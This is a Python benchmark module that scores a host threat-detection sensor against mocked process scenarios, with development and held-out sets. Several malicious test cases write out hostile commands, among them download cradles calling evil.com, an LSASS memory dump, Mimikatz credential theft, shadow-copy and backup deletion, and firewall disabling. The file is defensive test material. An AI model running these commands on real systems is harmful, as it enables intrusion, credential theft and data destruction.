"""
SOC Alert Analyzer — Empirical Detection Evaluation & Benchmark Suite
Provides curated, versioned, and independent evaluation datasets for behavioral threat detection.
"""

from dataclasses import dataclass, asdict
from typing import List, Dict, Any, Optional
from unittest.mock import MagicMock
import json

from app.security.host_sensor import HostSecuritySensor

BENCHMARK_VERSION = "2.1.0"


@dataclass
class BenchmarkScenario:
    scenario_id: str
    family: str
    pid: int
    name: str
    exe: str
    cmdline: List[str]
    is_malicious: bool
    parent_name: Optional[str] = None
    mitre_technique: Optional[str] = None
    rationale: str = ""

    def to_mock_proc(self):
        p = MagicMock()
        p.pid = self.pid
        p.name.return_value = self.name
        p.exe.return_value = self.exe
        p.cmdline.return_value = self.cmdline
        p.username.return_value = "SYSTEM"
        p.create_time.return_value = 1700000000

        if self.parent_name:
            parent = MagicMock()
            parent.name.return_value = self.parent_name
            p.parent.return_value = parent
        else:
            p.parent.return_value = None
        return p


# -------------------------------------------------------------
# 1. Development Baseline Dataset (20 Curated Scenarios)
# -------------------------------------------------------------
BASELINE_SCENARIOS: List[BenchmarkScenario] = [
    # 10 Malicious
    BenchmarkScenario(
        scenario_id="dev_webshell_w3wp",
        family="WebShell",
        pid=1001,
        name="cmd.exe",
        exe="C:\\Windows\\System32\\cmd.exe",
        cmdline=["cmd.exe", "/c", "whoami"],
        parent_name="w3wp.exe",
        is_malicious=True,
        mitre_technique="T1505.003",
        rationale="IIS worker process spawning shell is indicative of web shell interaction."
    ),
    BenchmarkScenario(
        scenario_id="dev_maldoc_word",
        family="Maldoc",
        pid=1002,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline=["powershell.exe", "-nop", "-w", "hidden"],
        parent_name="winword.exe",
        is_malicious=True,
        mitre_technique="T1204.002",
        rationale="Office word processor spawning PowerShell interpreter indicates macro execution."
    ),
    BenchmarkScenario(
        scenario_id="dev_shadow_purge",
        family="Ransomware",
        pid=1003,
        name="vssadmin.exe",
        exe="C:\\Windows\\System32\\vssadmin.exe",
        cmdline=["vssadmin.exe", "delete", "shadows", "/all", "/quiet"],
        is_malicious=True,
        mitre_technique="T1490",
        rationale="VSSAdmin volume shadow copy deletion is typical pre-encryption ransomware evasion."
    ),
    BenchmarkScenario(
        scenario_id="dev_masquerading_svchost",
        family="Masquerading",
        pid=1004,
        name="svchost.exe",
        exe="C:\\Users\\Public\\svchost.exe",
        cmdline=["svchost.exe"],
        is_malicious=True,
        mitre_technique="T1036.005",
        rationale="Critical system binary name executing outside System32 directory."
    ),
    BenchmarkScenario(
        scenario_id="dev_offensive_mimikatz",
        family="CredentialDumping",
        pid=1005,
        name="mimikatz.exe",
        exe="C:\\Tools\\mimikatz.exe",
        cmdline=["mimikatz.exe"],
        is_malicious=True,
        mitre_technique="T1059",
        rationale="Known adversary credential dumping utility name."
    ),
    BenchmarkScenario(
        scenario_id="dev_encoded_ps",
        family="DefenseEvasion",
        pid=1006,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\powershell.exe",
        cmdline=["powershell.exe", "-enc", "SQBFAFgA"],
        is_malicious=True,
        mitre_technique="T1059.001",
        rationale="Base64 encoded execution flag in PowerShell command-line."
    ),
    BenchmarkScenario(
        scenario_id="dev_tunneling_chisel",
        family="CommandAndControl",
        pid=1007,
        name="chisel.exe",
        exe="C:\\Users\\Public\\chisel.exe",
        cmdline=["chisel.exe", "client", "10.0.0.1:8000"],
        is_malicious=True,
        mitre_technique="T1059",
        rationale="Network tunneling utility utilized for egress C2 pivoting."
    ),
    BenchmarkScenario(
        scenario_id="dev_cradle_download",
        family="DefenseEvasion",
        pid=1008,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\powershell.exe",
        cmdline=["powershell.exe", "-nop", "-c", "downloadstring"],
        is_malicious=True,
        mitre_technique="T1059.001",
        rationale="In-memory download cradle execution pattern."
    ),
    BenchmarkScenario(
        scenario_id="dev_maldoc_excel",
        family="Maldoc",
        pid=1009,
        name="cmd.exe",
        exe="C:\\Windows\\System32\\cmd.exe",
        cmdline=["cmd.exe", "/c", "calc.exe"],
        parent_name="excel.exe",
        is_malicious=True,
        mitre_technique="T1204.002",
        rationale="Spreadsheet software launching shell indicates exploit or malicious macro."
    ),
    BenchmarkScenario(
        scenario_id="dev_temp_execution",
        family="Masquerading",
        pid=1010,
        name="payload.exe",
        exe="C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe",
        cmdline=["payload.exe"],
        is_malicious=True,
        mitre_technique="T1036",
        rationale="Unsigned binary dropping and executing from user temporary staging directory."
    ),

    # 10 Benign
    BenchmarkScenario(
        scenario_id="dev_benign_chrome",
        family="BenignWorkstation",
        pid=2001,
        name="chrome.exe",
        exe="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        cmdline=["chrome.exe"],
        parent_name="explorer.exe",
        is_malicious=False,
        rationale="Standard web browser execution from Program Files under explorer."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_vscode",
        family="BenignDeveloper",
        pid=2002,
        name="code.exe",
        exe="C:\\Users\\User\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
        cmdline=["Code.exe"],
        parent_name="ide",
        is_malicious=False,
        rationale="Standard developer code editor execution in local programs path."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_svchost",
        family="BenignSystem",
        pid=2003,
        name="svchost.exe",
        exe="C:\\Windows\\System32\\svchost.exe",
        cmdline=["svchost.exe", "-k", "netsvcs"],
        parent_name="services.exe",
        is_malicious=False,
        rationale="Legitimate service host executing from System32 spawned by services.exe."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_ps_diag",
        family="BenignAdmin",
        pid=2004,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline=["powershell.exe", "Get-Process"],
        parent_name="explorer.exe",
        is_malicious=False,
        rationale="Standard PowerShell command without hidden flags or encoded payloads."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_notepad",
        family="BenignWorkstation",
        pid=2005,
        name="notepad.exe",
        exe="C:\\Windows\\System32\\notepad.exe",
        cmdline=["notepad.exe", "notes.txt"],
        parent_name="explorer.exe",
        is_malicious=False,
        rationale="Text editor reading a local file."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_devserver",
        family="BenignDeveloper",
        pid=2006,
        name="python.exe",
        exe="C:\\Python313\\python.exe",
        cmdline=["python.exe", "manage.py", "runserver"],
        parent_name="cmd.exe",
        is_malicious=False,
        rationale="Django local developer server execution under cmd."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_temp_updater",
        family="BenignWorkstation",
        pid=2007,
        name="Teams_updater.exe",
        exe="C:\\Users\\User\\AppData\\Local\\Temp\\Teams_updater.exe",
        cmdline=["Teams_updater.exe", "--check"],
        is_malicious=False,
        rationale="Legitimate application updater check in Temp directory."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_admin_script",
        family="BenignAdmin",
        pid=2008,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline=["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", "C:\\Scripts\\backup.ps1"],
        parent_name="explorer.exe",
        is_malicious=False,
        rationale="Administrator backup script execution."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_lsass",
        family="BenignSystem",
        pid=2009,
        name="lsass.exe",
        exe="C:\\Windows\\System32\\lsass.exe",
        cmdline=["C:\\Windows\\System32\\lsass.exe"],
        parent_name="wininit.exe",
        is_malicious=False,
        rationale="Genuine LSASS process spawned legitimately by wininit.exe in System32."
    ),
    BenchmarkScenario(
        scenario_id="dev_benign_node",
        family="BenignDeveloper",
        pid=2010,
        name="node.exe",
        exe="C:\\Program Files\\nodejs\\node.exe",
        cmdline=["node.exe", "server.js"],
        parent_name="cmd.exe",
        is_malicious=False,
        rationale="Node.js development server running from Program Files."
    )
]

# -------------------------------------------------------------
# 2. Independent Held-Out Benchmark Dataset (30 Scenarios)
# -------------------------------------------------------------
HELDOUT_SCENARIOS: List[BenchmarkScenario] = [
    # 15 Malicious
    BenchmarkScenario(
        scenario_id="held_out_webshell_nginx",
        family="WebShell",
        pid=4001,
        name="bash",
        exe="/usr/sbin/nginx",
        cmdline=["bash", "-i"],
        parent_name="nginx",
        is_malicious=True,
        mitre_technique="T1505.003",
        rationale="Nginx web server spawning interactive bash shell."
    ),
    BenchmarkScenario(
        scenario_id="held_out_maldoc_powerpnt",
        family="Maldoc",
        pid=4002,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline=["powershell.exe", "-w", "hidden", "-enc", "AAA="],
        parent_name="powerpnt.exe",
        is_malicious=True,
        mitre_technique="T1204.002",
        rationale="PowerPoint presentation software launching hidden PowerShell."
    ),
    BenchmarkScenario(
        scenario_id="held_out_ransomware_wmic",
        family="Ransomware",
        pid=4003,
        name="wmic.exe",
        exe="C:\\Windows\\System32\\wbem\\WMIC.exe",
        cmdline=["wmic", "shadowcopy", "delete"],
        is_malicious=True,
        mitre_technique="T1490",
        rationale="WMIC command deleting volume shadow copies."
    ),
    BenchmarkScenario(
        scenario_id="held_out_ransomware_wbadmin",
        family="Ransomware",
        pid=4004,
        name="wbadmin.exe",
        exe="C:\\Windows\\System32\\wbadmin.exe",
        cmdline=["wbadmin", "delete", "catalog", "-quiet"],
        is_malicious=True,
        mitre_technique="T1490",
        rationale="Windows backup catalog deletion to prevent system recovery."
    ),
    BenchmarkScenario(
        scenario_id="held_out_masquerading_lsass",
        family="Masquerading",
        pid=4005,
        name="lsass.exe",
        exe="C:\\Users\\Public\\lsass.exe",
        cmdline=["lsass.exe"],
        is_malicious=True,
        mitre_technique="T1036.005",
        rationale="LSASS process masquerading outside System32 in Public directory."
    ),
    BenchmarkScenario(
        scenario_id="held_out_masquerading_csrss",
        family="Masquerading",
        pid=4006,
        name="csrss.exe",
        exe="C:\\Temp\\csrss.exe",
        cmdline=["csrss.exe"],
        is_malicious=True,
        mitre_technique="T1036.005",
        rationale="CSRSS subsystem binary masquerading in Temp folder."
    ),
    BenchmarkScenario(
        scenario_id="held_out_offensive_bloodhound",
        family="Discovery",
        pid=4007,
        name="bloodhound.exe",
        exe="C:\\Tools\\bloodhound.exe",
        cmdline=["bloodhound.exe"],
        is_malicious=True,
        mitre_technique="T1059",
        rationale="Active Directory attack path exploration binary."
    ),
    BenchmarkScenario(
        scenario_id="held_out_offensive_xmrig",
        family="Impact",
        pid=4008,
        name="xmrig.exe",
        exe="C:\\ProgramData\\xmrig.exe",
        cmdline=["xmrig.exe", "-o", "stratum+tcp://pool:3333"],
        is_malicious=True,
        mitre_technique="T1496",
        rationale="Cryptocurrency mining agent unauthorized resource consumption."
    ),
    BenchmarkScenario(
        scenario_id="held_out_offensive_psexec",
        family="LateralMovement",
        pid=4009,
        name="psexec.exe",
        exe="C:\\Admin\\psexec.exe",
        cmdline=["psexec.exe", "\\\\target", "cmd.exe"],
        is_malicious=True,
        mitre_technique="T1059",
        rationale="Remote service installation and process execution."
    ),
    BenchmarkScenario(
        scenario_id="held_out_encoded_pwsh",
        family="DefenseEvasion",
        pid=4010,
        name="pwsh.exe",
        exe="C:\\Program Files\\PowerShell\\7\\pwsh.exe",
        cmdline=["pwsh.exe", "-encodedcommand", "SQBFAFgA"],
        is_malicious=True,
        mitre_technique="T1059.001",
        rationale="PowerShell Core executing base64 encoded payload."
    ),
    BenchmarkScenario(
        scenario_id="held_out_cradle_iex",
        family="DefenseEvasion",
        pid=4011,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\powershell.exe",
        cmdline=["powershell.exe", "-nop", "-c", "IEX", "(New-Object Net.WebClient).DownloadFile('http://evil.com/x.exe','x.exe')"],
        is_malicious=True,
        mitre_technique="T1059.001",
        rationale="IEX cradle downloading and executing remote artifact."
    ),
    BenchmarkScenario(
        scenario_id="held_out_cred_procdump",
        family="CredentialDumping",
        pid=4012,
        name="procdump.exe",
        exe="C:\\Tools\\procdump.exe",
        cmdline=["procdump.exe", "-ma", "lsass.exe", "lsass.dmp"],
        is_malicious=True,
        mitre_technique="T1003",
        rationale="Process memory dump targeting LSASS."
    ),
    BenchmarkScenario(
        scenario_id="held_out_cred_sekurlsa",
        family="CredentialDumping",
        pid=4013,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\powershell.exe",
        cmdline=["powershell.exe", "Invoke-Mimikatz", "-Command", "sekurlsa::logonpasswords"],
        is_malicious=True,
        mitre_technique="T1003",
        rationale="In-memory script invocation of Mimikatz sekurlsa module."
    ),
    BenchmarkScenario(
        scenario_id="held_out_certutil_ingress",
        family="IngressToolTransfer",
        pid=4014,
        name="certutil.exe",
        exe="C:\\Windows\\System32\\certutil.exe",
        cmdline=["certutil.exe", "-urlcache", "-split", "-f", "http://evil.com/payload.exe", "payload.exe"],
        is_malicious=True,
        mitre_technique="T1105",
        rationale="Abusing living-off-the-land certutil as arbitrary file downloader."
    ),
    BenchmarkScenario(
        scenario_id="held_out_firewall_disabled",
        family="DefenseImpairment",
        pid=4015,
        name="netsh.exe",
        exe="C:\\Windows\\System32\\netsh.exe",
        cmdline=["netsh.exe", "advfirewall", "set", "allprofiles", "state", "off"],
        is_malicious=True,
        mitre_technique="T1562.001",
        rationale="Disabling host stateful firewall across all network profiles."
    ),

    # 15 Difficult Benign Edge Cases
    BenchmarkScenario(
        scenario_id="held_out_benign_dev_git",
        family="BenignDeveloper",
        pid=5001,
        name="git.exe",
        exe="C:\\Program Files\\Git\\bin\\git.exe",
        cmdline=["git.exe", "commit", "-m", "Security patch"],
        is_malicious=False,
        rationale="Developer Git commit workflow."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_dev_cargo",
        family="BenignDeveloper",
        pid=5002,
        name="cargo.exe",
        exe="C:\\Users\\Dev\\.cargo\\bin\\cargo.exe",
        cmdline=["cargo.exe", "build", "--release"],
        is_malicious=False,
        rationale="Rust package compiler build execution."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_dev_npm",
        family="BenignDeveloper",
        pid=5003,
        name="npm.cmd",
        exe="C:\\Program Files\\nodejs\\npm.cmd",
        cmdline=["npm.cmd", "run", "build"],
        is_malicious=False,
        rationale="Node package manager build task."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_sys_ping",
        family="BenignAdmin",
        pid=5004,
        name="ping.exe",
        exe="C:\\Windows\\System32\\PING.EXE",
        cmdline=["ping.exe", "-n", "4", "192.168.1.1"],
        is_malicious=False,
        rationale="ICMP diagnostic tool verifying gateway connectivity."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_sys_tracert",
        family="BenignAdmin",
        pid=5005,
        name="tracert.exe",
        exe="C:\\Windows\\System32\\tracert.exe",
        cmdline=["tracert.exe", "8.8.8.8"],
        is_malicious=False,
        rationale="Routing path trace tool."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_sys_tasklist",
        family="BenignAdmin",
        pid=5006,
        name="tasklist.exe",
        exe="C:\\Windows\\System32\\tasklist.exe",
        cmdline=["tasklist.exe", "/v"],
        is_malicious=False,
        rationale="System diagnostic process enumerator."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_sys_systeminfo",
        family="BenignAdmin",
        pid=5007,
        name="systeminfo.exe",
        exe="C:\\Windows\\System32\\systeminfo.exe",
        cmdline=["systeminfo.exe"],
        is_malicious=False,
        rationale="OS configuration query utility."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_netsh_status",
        family="BenignAdmin",
        pid=5008,
        name="netsh.exe",
        exe="C:\\Windows\\System32\\netsh.exe",
        cmdline=["netsh.exe", "advfirewall", "show", "allprofiles"],
        is_malicious=False,
        rationale="Auditing firewall status (read-only query, does not disable state)."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_certutil_verify",
        family="BenignAdmin",
        pid=5009,
        name="certutil.exe",
        exe="C:\\Windows\\System32\\certutil.exe",
        cmdline=["certutil.exe", "-verify", "C:\\Certs\\webserver.crt"],
        is_malicious=False,
        rationale="Verifying local certificate validity (no URL download flags)."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_notepad_shadow",
        family="BenignWorkstation",
        pid=5010,
        name="notepad.exe",
        exe="C:\\Windows\\System32\\notepad.exe",
        cmdline=["notepad.exe", "C:\\Docs\\ShadowCopyGuide.txt"],
        is_malicious=False,
        rationale="Editing text documentation containing the word 'shadow' in filename."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_python_pytest",
        family="BenignDeveloper",
        pid=5011,
        name="python.exe",
        exe="C:\\Python313\\python.exe",
        cmdline=["python.exe", "-m", "pytest", "-v"],
        is_malicious=False,
        rationale="Running automated unit test runner."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_powershell_diag",
        family="BenignAdmin",
        pid=5012,
        name="powershell.exe",
        exe="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline=["powershell.exe", "Get-NetIPAddress", "-AddressFamily", "IPv4"],
        is_malicious=False,
        rationale="Reading network interface configuration."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_appdata_slack",
        family="BenignWorkstation",
        pid=5013,
        name="slack.exe",
        exe="C:\\Users\\User\\AppData\\Local\\Programs\\Slack\\slack.exe",
        cmdline=["slack.exe"],
        is_malicious=False,
        rationale="Standard collaboration desktop software."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_system32_csrss",
        family="BenignSystem",
        pid=5014,
        name="csrss.exe",
        exe="C:\\Windows\\System32\\csrss.exe",
        cmdline=["C:\\Windows\\System32\\csrss.exe"],
        is_malicious=False,
        rationale="Genuine Windows CSRSS binary executing inside System32."
    ),
    BenchmarkScenario(
        scenario_id="held_out_benign_vscode_updater",
        family="BenignDeveloper",
        pid=5015,
        name="Code_installer.exe",
        exe="C:\\Users\\User\\AppData\\Local\\Temp\\Code_installer.exe",
        cmdline=["Code_installer.exe", "/silent"],
        is_malicious=False,
        rationale="Legitimate IDE installer running from Temp."
    )
]


def check_dataset_overlap(
    dev_set: List[BenchmarkScenario],
    eval_set: List[BenchmarkScenario]
) -> List[str]:
    """
    Detects potential train/test data leakage by checking for overlapping scenario IDs,
    commandlines, or identical execution targets between development and held-out sets.
    """
    overlaps = []
    dev_ids = {s.scenario_id for s in dev_set}
    eval_ids = {s.scenario_id for s in eval_set}
    common_ids = dev_ids.intersection(eval_ids)
    if common_ids:
        overlaps.append(f"Duplicate scenario IDs found: {common_ids}")

    dev_cmds = {" ".join(s.cmdline).lower(): s.scenario_id for s in dev_set}
    for s in eval_set:
        cmd_str = " ".join(s.cmdline).lower()
        if cmd_str in dev_cmds:
            overlaps.append(
                f"Commandline collision: '{cmd_str}' shared between {dev_cmds[cmd_str]} and {s.scenario_id}"
            )
    return overlaps


def evaluate_dataset(name: str, scenarios: List[BenchmarkScenario], sensor: Optional[HostSecuritySensor] = None) -> Dict[str, Any]:
    if sensor is None:
        sensor = HostSecuritySensor()

    tp, fp, tn, fn = 0, 0, 0, 0
    results = []

    for scenario in scenarios:
        sensor.seen_signatures.clear()
        mock_proc = scenario.to_mock_proc()
        events = sensor._analyze_single_process(mock_proc)
        detected = len(events) > 0

        if scenario.is_malicious and detected:
            tp += 1
            cat = "TP"
        elif scenario.is_malicious and not detected:
            fn += 1
            cat = "FN"
        elif not scenario.is_malicious and detected:
            fp += 1
            cat = "FP"
        else:
            tn += 1
            cat = "TN"

        results.append({
            "scenario_id": scenario.scenario_id,
            "family": scenario.family,
            "is_malicious": scenario.is_malicious,
            "detected": detected,
            "category": cat,
            "mitre_technique": scenario.mitre_technique
        })

    total = len(scenarios)
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    specificity = tn / (tn + fp) if (tn + fp) > 0 else 0.0
    f1_score = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    accuracy = (tp + tn) / total if total > 0 else 0.0

    return {
        "name": name,
        "support": total,
        "true_positives": tp,
        "false_positives": fp,
        "true_negatives": tn,
        "false_negatives": fn,
        "precision": precision,
        "recall": recall,
        "specificity": specificity,
        "f1_score": f1_score,
        "false_positive_rate": fpr,
        "accuracy": accuracy,
        "results": results
    }


def run_full_benchmark(output_json_path: Optional[str] = None) -> Dict[str, Any]:
    """Executes full empirical benchmark across development and held-out datasets."""
    overlap = check_dataset_overlap(BASELINE_SCENARIOS, HELDOUT_SCENARIOS)
    if overlap:
        raise ValueError(f"Dataset integrity error — overlapping cases detected: {overlap}")

    res_dev = evaluate_dataset("Development Baseline (20 Curated)", BASELINE_SCENARIOS)
    res_held = evaluate_dataset("Held-Out Benchmark (30 Scenarios)", HELDOUT_SCENARIOS)

    tot_support = res_dev["support"] + res_held["support"]
    tot_tp = res_dev["true_positives"] + res_held["true_positives"]
    tot_fp = res_dev["false_positives"] + res_held["false_positives"]
    tot_tn = res_dev["true_negatives"] + res_held["true_negatives"]
    tot_fn = res_dev["false_negatives"] + res_held["false_negatives"]

    overall_prec = tot_tp / (tot_tp + tot_fp) if (tot_tp + tot_fp) > 0 else 0.0
    overall_rec = tot_tp / (tot_tp + tot_fn) if (tot_tp + tot_fn) > 0 else 0.0
    overall_f1 = (2 * overall_prec * overall_rec) / (overall_prec + overall_rec) if (overall_prec + overall_rec) > 0 else 0.0
    overall_fpr = tot_fp / (tot_fp + tot_tn) if (tot_fp + tot_tn) > 0 else 0.0
    overall_acc = (tot_tp + tot_tn) / tot_support if tot_support > 0 else 0.0

    report = {
        "benchmark_version": BENCHMARK_VERSION,
        "dataset_type": "Curated Synthetic Behavioral Benchmark (User-Space EDR-Lite)",
        "limitations": (
            "Empirical evaluation is performed on synthetic process execution scenarios. "
            "These metrics reflect detection capability against modeled TTPs and administrative "
            "edge cases, but do NOT guarantee detection against novel kernel-level exploits or evasive zero-days."
        ),
        "development_dataset": res_dev,
        "held_out_dataset": res_held,
        "overall_summary": {
            "total_support": tot_support,
            "true_positives": tot_tp,
            "false_positives": tot_fp,
            "true_negatives": tot_tn,
            "false_negatives": tot_fn,
            "precision": overall_prec,
            "recall": overall_rec,
            "f1_score": overall_f1,
            "false_positive_rate": overall_fpr,
            "accuracy": overall_acc
        }
    }

    if output_json_path:
        with open(output_json_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)

    return report
